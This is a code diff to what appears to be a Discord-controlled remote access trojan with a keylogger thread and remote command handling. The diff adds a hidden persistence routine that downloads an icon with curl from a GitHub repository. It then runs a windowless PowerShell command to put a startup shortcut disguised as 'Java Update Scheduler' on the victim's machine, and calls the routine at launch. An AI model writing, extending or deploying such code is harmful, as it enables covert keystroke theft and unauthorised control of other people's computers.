@@ -46,7 +46,7 @@ from pynput.keyboard import Key, Listener
 
 # _____________________________________________________________________________________________________________________________________ #
 # ===================================================================================================================================== #
-BOT_TOKEN = "%"
+BOT_TOKEN = "%"  # %
 
 
 # _____________________________________________________________________________________________________________________________________ #
@@ -56,6 +56,9 @@ ROAMING = os.getenv('APPDATA')
 
 userPath = f"C:\\Users\\{os.getlogin()}"
 binPath = f"C:\\Users\\{os.getlogin()}\\bin"
+
+shortcutPath = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+scriptPath = os.path.abspath(__file__)
 
 if not os.path.exists(binPath):
     os.mkdir(binPath)
@@ -98,6 +101,18 @@ def KillProcess(processName):
     if processName not in result.stdout:
         return
     subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+def AddPersistance():
+    iconPath = f"{binPath}\\icon.ico"
+    subprocess.run(["curl", "https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/refs/heads/main/java.ico", "-o", iconPath], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    psCmd = f"""
+$s=(New-Object -COM WScript.Shell).CreateShortcut('{shortcutPath}\\Java Update Scheduler.lnk');
+$s.TargetPath='{scriptPath}';
+$s.IconLocation='{iconPath}';
+$s.Save()
+"""
+    subprocess.run(["powershell", "-Command", psCmd], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
 
 # _____________________________________________________________________________________________________________________________________ #
 # ===================================================================================================================================== #
@@ -443,8 +458,9 @@ class Client(discord.Client):
         KEYLOGGER_THREAD = threading.Thread(target=KeyloggerThread)
         KEYLOGGER_THREAD.start()
 
+
     # _________________________________________________________________________________________________________________________________________________ #
-# ===================================================================== COMMUNICATIONS ================================================================ #
+    # ===================================================================== COMMUNICATIONS ================================================================ #
     async def on_message(self, message):
         global keyloggerStatut, keyloggerPressedKeys, cmdDirectory
 
@@ -747,7 +763,10 @@ Internet Provider: {org}
                 embed = discord.Embed(description=f":no_entry: Unkown command `{message.content}`", color=discord.Color.red())
                 await message.channel.send(embed=embed)
                 
-                
+
+
+AddPersistance()
+
 intents = discord.Intents.default()
 intents.message_content = True
 client = Client(intents=intents)
